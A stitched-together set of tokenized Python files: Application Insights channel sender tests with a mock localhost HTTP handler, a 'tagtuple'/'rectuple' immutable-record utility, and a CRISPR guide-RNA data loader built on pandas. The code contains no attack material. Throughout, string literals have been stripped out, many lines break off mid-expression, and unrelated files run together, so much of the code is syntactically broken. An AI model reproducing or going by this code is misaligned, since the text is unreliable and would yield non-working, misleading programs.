~~ from applicationinsights import channel \n 
\n 
class TestSenderBase ( unittest . TestCase ) : \n 
~~~ def test_construct ( self ) : \n 
~~~ actual = channel . SenderBase ( ) \n 
self . assertIsNotNone ( actual ) \n 
self . assertEqual ( , actual . service_endpoint_uri ) \n 
self . assertIsNone ( actual . queue ) \n 
self . assertEqual ( 100 , actual . send_buffer_size ) \n 
\n 
~~ def test_service_endpoint_uri_works_as_expected ( self ) : \n 
~~~ actual = channel . SenderBase ( ) \n 
self . assertEqual ( , actual . service_endpoint_uri ) \n 
actual . service_endpoint_uri = \n 
self . assertEqual ( , actual . service_endpoint_uri ) \n 
\n 
~~ def test_queue_works_as_expected ( self ) : \n 
~~~ actual = channel . SenderBase ( ) \n 
self . assertIsNone ( actual . queue ) \n 
expected = object ( ) \n 
actual . queue = expected \n 
self . assertEqual ( expected , actual . queue ) \n 
\n 
~~ def test_send_buffer_size_works_as_expected ( self ) : \n 
~~~ actual = channel . SenderBase ( ) \n 
self . assertEqual ( 100 , actual . send_buffer_size ) \n 
actual . send_buffer_size = 42 \n 
self . assertEqual ( 42 , actual . send_buffer_size ) \n 
actual . send_buffer_size = - 1 \n 
self . assertEqual ( 1 , actual . send_buffer_size ) \n 
\n 
~~ def test_send_works_as_expected ( self ) : \n 
~~~ port = random . randint ( 50000 , 60000 ) \n 
actual = channel . SenderBase ( "http://localhost:" + str ( port ) + "/track" ) \n 
actual . queue = channel . QueueBase ( None ) \n 
MockHTTPRequestHandler . ExpectedContent = "[42, 13]" \n 
MockHTTPRequestHandler . TestCase = self # save a reference to the test case in our handler \n 
thread = WorkerThread ( actual ) \n 
thread . start ( ) \n 
runHttpHandlerOnce ( handler = MockHTTPRequestHandler , port = port ) # run the HTTP request \n 
thread . join ( ) \n 
if "failed" in dir ( self ) : \n 
~~~ self . fail ( self . failed ) \n 
~~ self . assertEqual ( None , actual . queue . get ( ) ) \n 
\n 
\n 
~~ ~~ class WorkerThread ( threading . Thread ) : \n 
~~~ def __init__ ( self , sender ) : \n 
~~~ threading . Thread . __init__ ( self ) \n 
self . sender = sender \n 
\n 
~~ def run ( self ) : \n 
~~~ time . sleep ( 1 ) \n 
self . sender . send ( [ MockSerializable ( 42 ) , MockSerializable ( 13 ) ] ) \n 
\n 
\n 
~~ ~~ class MockSerializable ( object ) : \n 
~~~ def __init__ ( self , data ) : \n 
~~~ self . _data = data \n 
\n 
~~ def write ( self ) : \n 
~~~ return self . _data \n 
\n 
\n 
~~ ~~ class MockHTTPRequestHandler ( HTTPServer . BaseHTTPRequestHandler ) : \n 
~~~ ExpectedContent = None \n 
TestCase = None \n 
def do_POST ( self ) : \n 
~~~ contentLength = int ( self . headers [ ] ) \n 
content = self . rfile . read ( contentLength ) \n 
response = "" \n 
if isinstance ( content , bytes ) : \n 
~~~ content = content . decode ( "utf-8" ) \n 
response = b"" \n 
\n 
~~ if "POST" != self . command : \n 
~~~ MockHTTPRequestHandler . TestCase . failed = \'"POST" != self.command\' \n 
~~ if "application/json; charset=utf-8" != self . headers [ "Content-Type" ] : \n 
~~~ MockHTTPRequestHandler . TestCase . failed = \'"application/json; charset=utf-8" != self.headers.type\' ~~ if MockHTTPRequestHandler . ExpectedContent != content : \n 
~~~ MockHTTPRequestHandler . TestCase . failed = \'"\' + MockHTTPRequestHandler . ExpectedContent + \n 
~~ self . send_response ( 200 ) \n 
self . send_header ( "Content-Type" , "application/json" ) \n 
self . send_header ( "Content-Length" , "0" ) \n 
self . end_headers ( ) \n 
self . wfile . write ( response ) \n 
\n 
\n 
~~ ~~ def runHttpHandlerOnce ( server = HTTPServer . HTTPServer , handler = HTTPServer . BaseHTTPRequestHandler , port ~~~ serverAddress = ( , port ) \n 
httpd = server ( serverAddress , handler ) \n 
httpd . handle_request ( ) from . import TestEnable # \n 
# Copyright (c) Microsoft Corporation. All Rights Reserved. \n 
# \n 
~~ """\nImmutable data structures based on Python\'s tuple (and inspired by\nnamedtuple).\n\nDefines:\ntagtuple -- A tagged variant of tuple\nrectuple -- A record with named fields (a\'la namedtuple)\n\n""" \n 
\n 
\n 
import sys as _sys \n 
from operator import itemgetter as _itemgetter \n 
from keyword import iskeyword as _iskeyword \n 
from collections import OrderedDict \n 
\n 
\n 
################################################################################ \n 
### tagtuple \n 
################################################################################ \n 
\n 
class tagtuple ( tuple ) : \n 
~~~ """\n    tagtuple -- A variant of tuple that acts as a tagged immutable\n    container for a sequence of elements. Instances of different\n    tagtuple subclasses are are never equal. tagtuples are constracted\n    from a sequence of arguments, and not from an iterable (i.e.:\n    tagtuple(*range(10)) instead of tagtuple(range(10)).\n\n    Subclasses should set __slots__ = ()\n    """ \n 
\n 
__slots__ = ( ) \n 
\n 
def __new__ ( cls , * args ) : \n 
~~~ """\n        Create new instance of tagtuple\n\n        tagtuples are constracted from a sequence of arguments, and\n        not from an iterable. This means:\n\n        tagtuple(range(10)) --> tagtuple with 1 element that is a list\n        tagtuple(*range(10)) --> tagtuple with 10 int elements\n        """ \n 
return super ( tagtuple , cls ) . __new__ ( cls , args ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ """Return a nicely formatted representation string""" \n 
return type ( self ) . __name__ + super ( tagtuple , self ) . __repr__ ( ) \n 
\n 
~~ def __getnewargs__ ( self ) : \n 
~~~ """Return self as a plain tuple.  Used by copy and pickle.""" \n 
return tuple ( self ) \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ return type ( self ) is type ( other ) and super ( tagtuple , self ) . __eq__ ( other ) \n 
\n 
~~ def __ne__ ( self , other ) : \n 
~~~ return not self . __eq__ ( other ) \n 
\n 
# no need for a custom hash, as set and dict also use __eq__ \n 
# def __hash__(self): \n 
#     return hash((type(self), ) + self) \n 
\n 
~~ def __getslice__ ( self , i , j ) : \n 
~~~ return type ( self ) ( * super ( tagtuple , self ) . __getslice__ ( i , j ) ) \n 
\n 
# disable many tuple methods \n 
~~ __add__ = property ( ) \n 
__contains__ = property ( ) # can be implemented \n 
#__eq__ = property() \n 
#__ge__ = property() \n 
#__getitem__ = property() \n 
#__getnewargs__ = property() \n 
#__getslice__ = property() \n 
#__gt__ = property() \n 
#__iter__ = property() \n 
#__le__ = property() \n 
#__len__ = property() \n 
#__lt__ = property() \n 
__mul__ = property ( ) \n 
#__ne__ = property() \n 
__rmul__ = property ( ) \n 
count = property ( ) \n 
index = property ( ) \n 
\n 
\n 
################################################################################ \n 
### rectuple \n 
################################################################################ \n 
\n 
~~ _class_template = \n 
\n 
_repr_template = \n 
\n 
_field_template = \n 
\n 
def rectuple ( typename , field_names , verbose = False , rename = False ) : \n 
~~~ """\n    Returns a new subclass of tuple that acts like a record.\n\n    Used to represent an immutable record with named fields. Compared\n    to namedtuple, it behaves less like a tuple and more like a\n    record. rectuples from different classes are never equal, and they\n    cannot be added or multiplied like tuples.\n    """ \n 
\n 
\n 
# message or automatically replace the field name with a valid name. \n 
if isinstance ( field_names , basestring ) : \n 
~~~ field_names = field_names . replace ( , ) . split ( ) \n 
~~ field_names = map ( str , field_names ) \n 
if rename : \n 
~~~ seen = set ( ) \n 
for index , name in enumerate ( field_names ) : \n 
~~~ if ( not all ( c . isalnum ( ) or c == for c in name ) \n 
or _iskeyword ( name ) \n 
or not name \n 
or name [ 0 ] . isdigit ( ) \n 
or name . startswith ( ) \n 
or name in seen ) : \n 
~~~ field_names [ index ] = % index \n 
~~ seen . add ( name ) \n 
~~ ~~ for name in [ typename ] + field_names : \n 
~~~ if not all ( c . isalnum ( ) or c == for c in name ) : \n 
~~~ raise ValueError ( \n 
% name ) \n 
~~ if _iskeyword ( name ) : \n 
~~~ raise ValueError ( \n 
% name ) \n 
~~ if name [ 0 ] . isdigit ( ) : \n 
~~~ raise ValueError ( \n 
% name ) \n 
~~ ~~ seen = set ( ) \n 
for name in field_names : \n 
~~~ if name . startswith ( ) and not rename : \n 
~~~ raise ValueError ( \n 
% name ) \n 
~~ if name in seen : \n 
~~~ raise ValueError ( % name ) \n 
~~ seen . add ( name ) \n 
\n 
# Fill-in the class template \n 
~~ class_definition = _class_template . format ( \n 
typename = typename , \n 
field_names = tuple ( field_names ) , \n 
num_fields = len ( field_names ) , \n 
arg_list = repr ( tuple ( field_names ) ) . replace ( "\'" , "" ) [ 1 : - 1 ] , \n 
repr_fmt = . join ( _repr_template . format ( name = name ) \n 
for name in field_names ) , \n 
field_defs = . join ( _field_template . format ( index = index , name = name ) \n 
for index , name in enumerate ( field_names ) ) \n 
) \n 
if verbose : \n 
~~~ print class_definition \n 
\n 
# Execute the template string in a temporary namespace and support \n 
\n 
~~ namespace = dict ( _itemgetter = _itemgetter , __name__ = % typename , \n 
OrderedDict = OrderedDict , _property = property , _tuple = tuple ) \n 
try : \n 
~~~ exec class_definition in namespace \n 
~~ except SyntaxError as e : \n 
~~~ raise SyntaxError ( e . message + + class_definition ) \n 
~~ result = namespace [ typename ] \n 
\n 
# For pickling to work, the __module__ variable needs to be set to the frame \n 
# where the named tuple is created.  Bypass this step in environments where \n 
# sys._getframe is not defined (Jython for example) or sys._getframe is not \n 
# defined for arguments greater than 0 (IronPython). \n 
try : \n 
~~~ result . __module__ = _sys . _getframe ( 1 ) . f_globals . get ( , ) \n 
~~ except ( AttributeError , ValueError ) : \n 
~~~ pass \n 
\n 
~~ return result \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ import pickle \n 
from itertools import chain , product \n 
\n 
print "Testing tagtuple:" \n 
print \n 
\n 
class A ( tagtuple ) : \n 
~~~ __slots__ = ( ) \n 
\n 
~~ class B ( tagtuple ) : \n 
~~~ __slots__ = ( ) \n 
\n 
~~ a = A ( 1 , 2 , 3 ) \n 
b = B ( 1 , 2 , 3 ) \n 
t = ( 1 , 2 , 3 ) \n 
\n 
print "a: " , a \n 
print "b: " , b \n 
print "t: " , t \n 
print \n 
print "a == b: " , a == b \n 
print "a != b: " , a != b \n 
print "hash(a) == hash(b): " , hash ( a ) == hash ( b ) \n 
print "a <= b: " , a <= b \n 
print "b <= a: " , b <= a \n 
print \n 
print "a == t: " , a == t \n 
print "a != t: " , a != t \n 
print "hash(a) == hash(t): " , hash ( a ) == hash ( t ) \n 
print "a <= t: " , a <= t \n 
print "t <= a: " , t <= a \n 
print \n 
d = { } \n 
d [ a ] = 1 \n 
d [ b ] = 2 \n 
d [ t ] = 3 \n 
print "d: " , d \n 
s = set ( ) \n 
s . add ( a ) \n 
s . add ( b ) \n 
s . add ( t ) \n 
print "s: " , s \n 
print \n 
print "tuple(x for x in a): " , tuple ( x for x in a ) \n 
print "list(a): " , list ( a ) \n 
print "tuple(a): " , tuple ( a ) \n 
print \n 
a0 = pickle . loads ( pickle . dumps ( a , 0 ) ) \n 
a1 = pickle . loads ( pickle . dumps ( a , 1 ) ) \n 
a2 = pickle . loads ( pickle . dumps ( a , 2 ) ) \n 
print "a0: " , a0 \n 
print "a1: " , a1 \n 
print "a2: " , a2 \n 
print "a0 == a, hash(a0) == hash(a): " , a0 == a , hash ( a0 ) == hash ( a ) \n 
print "a1 == a, hash(a1) == hash(a): " , a1 == a , hash ( a1 ) == hash ( a ) \n 
print "a2 == a, hash(a2) == hash(a): " , a2 == a , hash ( a2 ) == hash ( a ) \n 
print \n 
print "a[:]: " , a [ : ] \n 
print "a[1:-1]: " , a [ 1 : - 1 ] \n 
print "a + a: " , a + a \n 
print "a + b: " , a + b \n 
print "(0, ) + a: " , ( 0 , ) + a \n 
print "a + (0, ): " , a + ( 0 , ) \n 
print "2 * a: " , 2 * a \n 
print "a * 2: " , a * 2 \n 
print \n 
print "A(*chain((x**2 for x in range(10)), a)): " , A ( * chain ( ( x ** 2 for x in range ( 10 ) ) , a ) ) \n 
print "A(*product(range(3), repeat=2)): " , A ( * product ( range ( 3 ) , repeat = 2 ) ) \n 
print \n 
\n 
\n 
print "Testing rectuple:" \n 
print \n 
\n 
A = rectuple ( , , verbose = True ) \n 
B = rectuple ( , , verbose = True ) \n 
\n 
a = A ( 1 , 2 ) \n 
b = B ( 1 , 2 ) \n 
t = ( 1 , 2 ) \n 
\n 
print "a: " , a \n 
print "b: " , b \n 
print "t: " , t \n 
print \n 
print "a == b: " , a == b \n 
print "a != b: " , a != b \n 
print "hash(a) == hash(b): " , hash ( a ) == hash ( b ) \n 
print "a <= b: " , a <= b \n 
print "b <= a: " , b <= a \n 
print \n 
print "a == t: " , a == t \n 
print "a != t: " , a != t \n 
print "hash(a) == hash(t): " , hash ( a ) == hash ( t ) \n 
print "a <= t: " , a <= t \n 
print "t <= a: " , t <= a \n 
print \n 
d = { } \n 
d [ a ] = 1 \n 
d [ b ] = 2 \n 
d [ t ] = 3 \n 
print "d: " , d \n 
s = set ( ) \n 
s . add ( a ) \n 
s . add ( b ) \n 
s . add ( t ) \n 
print "s: " , s \n 
print \n 
print "tuple(x for x in a): " , tuple ( x for x in a ) \n 
print "list(a): " , list ( a ) \n 
print "tuple(a): " , tuple ( a ) \n 
print \n 
a0 = pickle . loads ( pickle . dumps ( a , 0 ) ) \n 
a1 = pickle . loads ( pickle . dumps ( a , 1 ) ) \n 
a2 = pickle . loads ( pickle . dumps ( a , 2 ) ) \n 
print "a0: " , a0 \n 
print "a1: " , a1 \n 
print "a2: " , a2 \n 
print "a0 == a, hash(a0) == hash(a): " , a0 == a , hash ( a0 ) == hash ( a ) \n 
print "a1 == a, hash(a1) == hash(a): " , a1 == a , hash ( a1 ) == hash ( a ) \n 
print "a2 == a, hash(a2) == hash(a): " , a2 == a , hash ( a2 ) == hash ( a ) \n 
~~ import pandas \n 
import util \n 
import matplotlib . pyplot as plt \n 
import scipy as sp \n 
import scipy . stats \n 
import numpy as np \n 
import os \n 
\n 
cur_dir = os . path . dirname ( os . path . abspath ( __file__ ) ) \n 
\n 
def from_custom_file ( data_file , learn_options ) : \n 
# use semantics of when we load V2 data \n 
~~~ print "Loading inputs to predict from %s" % data_file \n 
data = pandas . read_csv ( data_file ) \n 
\n 
mandatory_columns = [ , , , ] \n 
for col in mandatory_columns : \n 
~~~ assert col in data . columns , "inputs for prediction must include these columns: %s" % mandatory_columns \n 
~~ Xdf = pandas . DataFrame ( data ) \n 
Xdf [ ] = Xdf [ ] \n 
Xdf = Xdf . set_index ( [ , ] ) \n 
Xdf [ ] = Xdf [ ] \n 
Xdf . index . names = [ , ] \n 
Xdf [ ] = [ % i for i in range ( Xdf . shape [ 0 ] ) ] \n 
Xdf = Xdf . set_index ( , append = True ) \n 
\n 
Y = None \n 
gene_position = Xdf [ [ , ] ] \n 
target_genes = np . unique ( Xdf . index . levels [ 1 ] ) \n 
\n 
learn_options = set_V2_target_names ( learn_options ) \n 
\n 
return Xdf , Y , gene_position , target_genes \n 
\n 
\n 
~~ def from_file ( data_file , learn_options , data_file2 = None , data_file3 = None ) : \n 
~~~ if learn_options [ "V" ] == 1 : # from Nature Biotech paper \n 
\n 
~~~ print "loading V%d data" % learn_options [ "V" ] \n 
\n 
assert not learn_options [ "weighted" ] is not None , "not supported for V1 data" \n 
annotations , gene_position , target_genes , Xdf , Y = read_V1_data ( data_file , learn_options ) \n 
\n 
learn_options [ ] = \n 
learn_options [ ] = \n 
learn_options [ ] = \n 
\n 
# NF: not sure why the line below was uncommented \n 
# gene_position, selected_ind, target_genes, Xdf, Y = extract_by_organism("mouse", Xdf, Y, gene_position) \n 
~~ elif learn_options [ "V" ] == 2 : # from Nov 2014, hot off the machines \n 
~~~ Xdf , drugs_to_genes , target_genes , Y , gene_position = read_V2_data ( data_file , learn_options ) \n 
# check that data is consistent with sgRNA score \n 
xx = Xdf [ ] . values \n 
yy = Y [ ] . values \n 
rr , pp = sp . stats . pearsonr ( xx , yy ) \n 
assert rr > 0 , "data processing has gone wrong as correlation with previous predictions is negative" \n 
learn_options = set_V2_target_names ( learn_options ) \n 
\n 
~~ elif learn_options [ "V" ] == 3 : # merge of V1 and V2--this is what is used for the final model \n 
# these are relative to the V2 data, and V1 will be made to automatically match \n 
~~~ learn_options [ ] = \n 
learn_options [ ] = \n 
learn_options [ ] = None \n 
\n 
Xdf , Y , gene_position , target_genes = mergeV1_V2 ( data_file , data_file2 , learn_options ) \n 
\n 
\n 
~~ elif learn_options [ "V" ] == 4 : # merge of V1 and V2 and the Xu et al data \n 
# these are relative to the V2 data, and V1 and Xu et al. will be made to automatically match ~~~ learn_options [ ] = \n 
learn_options [ ] = \n 
learn_options [ ] = None \n 
\n 
Xdf , Y , gene_position , target_genes = merge_all ( data_file , data_file2 , data_file3 , learn_options \n 
\n 
~~ elif learn_options [ ] == 5 : \n 
~~~ learn_options [ ] = \n 
learn_options [ ] = \n 
learn_options [ ] = None \n 
\n 
gene_position , target_genes , Xdf , Y = read_xu_et_al ( data_file3 ) \n 
\n 
\n 
# truncate down to 30--some data sets gave us more. \n 
~~ Xdf [ "30mer" ] = Xdf [ "30mer" ] . apply ( lambda x : x [ 0 : 30 ] ) \n 
\n 
return Xdf , Y , gene_position , target_genes \n 
\n 
\n 
~~ def set_V2_target_names ( learn_options ) : \n 
~~~ if not in learn_options . keys ( ) : \n 
~~~ learn_options [ ] = \n 
~~ if not in learn_options . keys ( ) : \n 
~~~ learn_options [ ] = \n 
~~ learn_options [ ] = \n 
return learn_options \n 
\n 
\n 
~~ def combine_organisms ( human_data , mouse_data ) : \n 
\n 
# xs slices through the pandas data frame to return another one \n 
~~~ cd13 = human_data . xs ( , level = , drop_level = False ) \n 
# y_names are column names, cd13 is a pandas object \n 
X_CD13 , Y_CD13 = util . get_data ( cd13 , y_names = [ , ] ) \n 
cd33 = human_data . xs ( , level = , drop_level = False ) \n 
X_CD33 , Y_CD33 = util . get_data ( cd33 , y_names = [ , , ] ) \n 
cd15 = human_data . xs ( , level = , drop_level = False ) \n 
X_CD15 , Y_CD15 = util . get_data ( cd15 , y_names = [ ] ) \n 
\n 
mouse_X = pandas . DataFrame ( ) \n 
mouse_Y = pandas . DataFrame ( ) \n 
for k in mouse_data . index . levels [ 1 ] : \n 
# is k the gene \n 
~~~ X , Y = util . get_data ( mouse_data . xs ( k , level = , drop_level = False ) , [ "On-target Gene" ] , mouse_X = pandas . concat ( [ mouse_X , X ] , axis = 0 ) \n 
mouse_Y = pandas . concat ( [ mouse_Y , Y ] , axis = 0 ) \n 
\n 
~~ X = pandas . concat ( [ X_CD13 , X_CD15 , X_CD33 , mouse_X ] , axis = 0 ) \n 
Y = pandas . concat ( [ Y_CD13 , Y_CD15 , Y_CD33 , mouse_Y ] , axis = 0 ) \n 
\n 
return X , Y \n 
\n 
\n 
~~ def read_V1_data ( data_file , learn_options , AML_file = cur_dir + "/data/V1_suppl_data.txt" ) : \n 
~~~ if data_file is None : \n 
~~~ data_file = cur_dir + "/data/V1_data.xlsx" \n 
~~ human_data = pandas . read_excel ( data_file , sheetname = 0 , index_col = [ 0 , 1 ] ) \n 
mouse_data = pandas . read_excel ( data_file , sheetname = 1 , index_col = [ 0 , 1 ] ) \n 
Xdf , Y = combine_organisms ( human_data , mouse_data ) \n 
\n 
# get position within each gene, then join and re-order \n 
# note that 11 missing guides we were told to ignore \n 
annotations = pandas . read_csv ( AML_file , delimiter = , index_col = [ 0 , 4 ] ) \n 
annotations . index . names = Xdf . index . names \n 
gene_position = pandas . merge ( Xdf , annotations , how = "inner" , left_index = True , right_index = True ) \n 
gene_position = util . impute_gene_position ( gene_position ) \n 
gene_position = gene_position [ [ , , Y = Y . loc [ gene_position . index ] \n 
Xdf = Xdf . loc [ gene_position . index ] \n 
\n 
Y [ ] = 1 # for bookeeping to keep consistent with V2 which uses this for "extra pairs" \n 
\n 
target_genes = Y [ ] . unique ( ) \n 
\n 
Y . index . names = [ , ] \n 
\n 
assert Xdf . index . equals ( Y . index ) , "The index of Xdf is different from the index of Y (this can cause inconsistencies/random performance later on)" \n 
if learn_options is not None and learn_options [ "flipV1target" ] : \n 
~~~ print "************************************************************************" \n 
print "*****************MATCHING DOENCH CODE (DEBUG MODE)**********************" \n 
print "************************************************************************" \n 
Y [ ] = Y [ ] < 0.2 # 1s are bad guides \n 
print "press c to continue" \n 
import ipdb \n 
ipdb . set_trace ( ) \n 
\n 
~~ return annotations , gene_position , target_genes , Xdf , Y \n 
\n 
~~ def rank_transform ( x ) : \n 
~~~ return 1.0 - sp . stats . mstats . rankdata ( x ) / sp . stats . mstats . rankdata ( x ) . max ( ) \n 
\n 
~~ def read_xu_et_al ( data_file , learn_options = None , verbose = True , subsetting = ) : \n 
~~~ if data_file is None : \n 
~~~ data_file = \n 
\n 
~~ datasets = [ , , ] \n 
aggregated = None \n 
\n 
for d in datasets : \n 
~~~ data_efficient = pandas . read_excel ( data_file , sheetname = % d , skiprows = 2 data_inefficient = pandas . read_excel ( data_file , sheetname = % d , skiprows \n 
data_efficient [ ] = 1. \n 
data_inefficient [ ] = 0. \n 
\n 
exp_data = pandas . concat ( ( data_efficient , data_inefficient ) ) \n 
exp_data [ ] = exp_data . groupby ( ) [ ] . transform ( exp_data [ ] = exp_data . groupby ( ) [ ] . transform ( \n 
if aggregated is None : \n 
~~~ aggregated = exp_data \n 
~~ else : \n 
~~~ aggregated = pandas . concat ( ( aggregated , exp_data ) ) \n 
\n 
\n 
# go from 40mer to 30mer \n 
~~ ~~ if subsetting == : \n 
~~~ aggregated [ "sequence(target+3\'+5\')" ] = aggregated [ "sequence(target+3\'+5\')" ] . apply ( lambda x : ~~ else : \n 
~~~ aggregated [ "sequence(target+3\'+5\')" ] = aggregated [ "sequence(target+3\'+5\')" ] . apply ( lambda x : \n 
# make sure EVEYTHING is uppercase \n 
~~ aggregated [ "sequence(target+3\'+5\')" ] = aggregated [ "sequence(target+3\'+5\')" ] . apply ( lambda x : x . upper \n 
# rename columns \n 
aggregated . rename ( columns = { "sequence(target+3\'+5\')" : , : , \n 
aggregated [ ] . loc [ aggregated [ ] == ] = \n 
aggregated [ ] . loc [ aggregated [ ] == ] = \n 
\n 
aggregated [ ] = aggregated [ [ , ] ] . mean ( axis = 1 ) \n 
df = aggregated \n 
df = df . rename ( columns = { : , : } ) \n 
df [ ] = \n 
df [ ] = 1 \n 
df = df . set_index ( [ , , ] ) \n 
df [ ] = df . index . get_level_values ( 0 ) \n 
df [ ] = df . index . get_level_values ( 1 ) \n 
df [ ] = \n 
df [ ] = df [ ] \n 
df [ ] = df [ ] \n 
df [ ] = df [ ] \n 
df [ ] = 0 \n 
df [ ] = 0 \n 
target_genes = np . unique ( df [ ] . values ) \n 
\n 
return df [ [ , , ] ] , target_genes \n 
~~ def read_V2_data ( data_file , learn_options = None , verbose = True ) : \n 
~~~ if data_file is None : \n 
~~~ data_file = cur_dir + "/data/V2_data.xlsx" \n 
\n 
# to compare \n 
# import predict as pr; a1, g1, t1, X1, Y1 = pr.data_setup() \n 
# a1.index.names \n 
\n 
~~ data = pandas . read_excel ( data_file , sheetname = "ResultsFiltered" , skiprows = range ( 0 , 6 + 1 ) , index_col # grab data relevant to each of three drugs, which exludes some genes \n 
# note gene MED12 has two drugs, all others have at most one \n 
Xdf = pandas . DataFrame ( ) \n 
\n 
# This comes from the "Pairs" tab in their excel sheet, \n 
# note HPRT/HPRT1 are same thing, and also PLX_2uM/PLcX_2uM \n 
known_pairs = { : [ , , , ] , \n 
: [ ] , \n 
: [ , , , ] } \n 
\n 
drugs_to_genes = { : [ , , , ] , \n 
: [ ] , \n 
: [ , , , ] } \n 
\n 
if learn_options is not None : \n 
~~~ assert not ( learn_options [ ] and learn_options [ ] ) , "extra pairs and all pairs options (in learn_options) can\'t be active simultaneously." \n 
if learn_options [ ] : \n 
~~~ drugs_to_genes [ ] . extend ( [ , , ] ) \n 
~~ elif learn_options [ ] : \n 
~~~ drugs_to_genes [ ] . extend ( [ , , , ] ) \n 
drugs_to_genes [ ] . extend ( [ , , , ] ) \n 
drugs_to_genes [ ] . extend ( [ , , , , , \n 
~~ ~~ count = 0 \n 
for drug in drugs_to_genes . keys ( ) : \n 
~~~ genes = drugs_to_genes [ drug ] \n 
for g in genes : \n 
~~~ Xtmp = data . copy ( ) . xs ( g , level = , drop_level = False ) \n 
Xtmp [ ] = drug \n 
Xtmp [ ] = Xtmp [ drug ] . copy ( ) # grab the drug results that are relevant for this gene \n 
if g in known_pairs [ drug ] : \n 
~~~ Xtmp [ ] = 1. \n 
~~ else : \n 
~~~ Xtmp [ ] = 0. \n 
\n 
~~ count = count + Xtmp . shape [ 0 ] \n 
Xdf = pandas . concat ( [ Xdf , Xtmp ] , axis = 0 ) \n 
if verbose : \n 
~~~ print "Loaded %d samples for gene %s \\ttotal number of samples: %d" % ( Xtmp . shape [ 0 ] \n 
# create new index that includes the drug \n 
~~ ~~ ~~ Xdf = Xdf . set_index ( , append = True ) \n 
\n 
Y = pandas . DataFrame ( Xdf . pop ( "score" ) ) \n 
Y . columns . names = [ "score" ] \n 
\n 
test_gene = pandas . DataFrame ( Xdf . pop ( ) ) \n 
target = pandas . DataFrame ( Xdf . index . get_level_values ( ) . values , index = Y . index , columns Y = pandas . concat ( ( Y , target , test_gene ) , axis = 1 ) \n 
target_genes = Y [ ] . unique ( ) \n 
gene_position = Xdf [ [ "Percent Peptide" , "Amino Acid Cut position" ] ] . copy ( ) \n 
\n 
# convert to ranks for each (gene, drug combo) \n 
# flip = True \n 
y_rank = pandas . DataFrame ( ) \n 
y_threshold = pandas . DataFrame ( ) \n 
y_quant = pandas . DataFrame ( ) \n 
for drug in drugs_to_genes . keys ( ) : \n 
~~~ gene_list = drugs_to_genes [ drug ] \n 
for gene in gene_list : \n 
~~~ ytmp = pandas . DataFrame ( Y . xs ( ( gene , drug ) , level = [ "Target gene" , "drug" ] , drop_level = False y_ranktmp , y_rank_raw , y_thresholdtmp , y_quanttmp = util . get_ranks ( ytmp , thresh = 0.8 , prefix # np.unique(y_rank.values-y_rank_raw.values) \n 
y_rank = pandas . concat ( ( y_rank , y_ranktmp ) , axis = 0 ) \n 
y_threshold = pandas . concat ( ( y_threshold , y_thresholdtmp ) , axis = 0 ) \n 
y_quant = pandas . concat ( ( y_quant , y_quanttmp ) , axis = 0 ) \n 
\n 
~~ ~~ yall = pandas . concat ( ( y_rank , y_threshold , y_quant ) , axis = 1 ) \n 
Y = pandas . merge ( Y , yall , how = , left_index = True , right_index = True ) \n 
\n 
# convert also by drug only, irrespective of gene \n 
y_rank = pandas . DataFrame ( ) \n 
y_threshold = pandas . DataFrame ( ) \n 
y_quant = pandas . DataFrame ( ) \n 
for drug in drugs_to_genes . keys ( ) : \n 
~~~ ytmp = pandas . DataFrame ( Y . xs ( drug , level = "drug" , drop_level = False ) [ ] ) \n 
y_ranktmp , y_rank_raw , y_thresholdtmp , y_quanttmp = util . get_ranks ( ytmp , thresh = 0.8 , prefix = # np.unique(y_rank.values-y_rank_raw.values) \n 
y_rank = pandas . concat ( ( y_rank , y_ranktmp ) , axis = 0 ) \n 
y_threshold = pandas . concat ( ( y_threshold , y_thresholdtmp ) , axis = 0 ) \n 
y_quant = pandas . concat ( ( y_quant , y_quanttmp ) , axis = 0 ) \n 
\n 
~~ yall = pandas . concat ( ( y_rank , y_threshold , y_quant ) , axis = 1 ) \n 
Y = pandas . merge ( Y , yall , how = , left_index = True , right_index = True ) \n 
\n 
PLOT = False \n 
if PLOT : \n 
# to better understand, try plotting something like: \n 
~~~ labels = [ "score" , "score_drug_gene_rank" , "score_drug_rank" , "score_drug_gene_threshold" , "score_drug_threshold" \n 
for label in labels : \n 
~~~ plt . figure ( ) \n 
plt . plot ( Xdf [ ] . values , Y [ label ] . values , ) \n 
r , pearp = sp . stats . pearsonr ( Xdf [ ] . values . flatten ( ) , Y [ label ] . values . flatten plt . title ( label + % ( r , pearp ) ) \n 
plt . xlabel ( "sgRNA prediction score" ) \n 
plt . ylabel ( label ) \n 
\n 
~~ ~~ gene_position = util . impute_gene_position ( gene_position ) \n 
\n 
if learn_options is not None and learn_options [ "weighted" ] == "variance" : \n 
~~~ print "computing weights from replicate variance..." \n 
# compute the variance across replicates so can use it as a weight \n 
data = pandas . read_excel ( data_file , sheetname = "Normalized" , skiprows = range ( 0 , 6 + 1 ) , index_col data . index . names = [ "Sequence" , "Target gene" ] \n 
\n 
experiments = { } \n 
experiments [ ] = [ , , , ] \n 
experiments [ ] = [ , , , ] \n 
experiments [ ] = [ , , , ] \n 
\n 
variance = None \n 
for drug in drugs_to_genes . keys ( ) : \n 
~~~ data_tmp = data . iloc [ data . index . get_level_values ( ) . isin ( drugs_to_genes [ drug data_tmp [ "drug" ] = drug \n 
data_tmp = data_tmp . set_index ( , append = True ) \n 
data_tmp [ "variance" ] = np . var ( data_tmp . values , axis = 1 ) \n 
if variance is None : \n 
~~~ variance = data_tmp [ "variance" ] . copy ( ) \n 
~~ else : \n 
~~~ variance = pandas . concat ( ( variance , data_tmp [ "variance" ] ) , axis = 0 ) \n 
\n 
~~ ~~ orig_index = Y . index . copy ( ) \n 
Y = pandas . merge ( Y , pandas . DataFrame ( variance ) , how = "inner" , left_index = True , right_index = True Y = Y . ix [ orig_index ] \n 
print "done." \n 
\n 
# Make sure to keep this check last in this function \n 
~~ assert Xdf . index . equals ( Y . index ) , "The index of Xdf is different from the index of Y (this can cause inconsistencies/random performance later on)" \n 
return Xdf , drugs_to_genes , target_genes , Y , gene_position \n 
\n 
\n 
~~ def merge_all ( data_file = None , data_file2 = None , data_file3 = None , learn_options = None ) : \n 
~~~ Xdf , Y , gene_position , target_genes = mergeV1_V2 ( data_file , data_file2 , learn_options ) \n 
gene_position_xu , target_genes_xu , Xdf_xu , Y_xu = read_xu_et_al ( data_file3 , learn_options ) \n 
Xdf = pandas . concat ( ( Xdf , Xdf_xu ) ) \n 
Y = pandas . concat ( ( Y , Y_xu ) ) \n 
gene_position = pandas . concat ( ( gene_position , gene_position_xu ) ) \n 
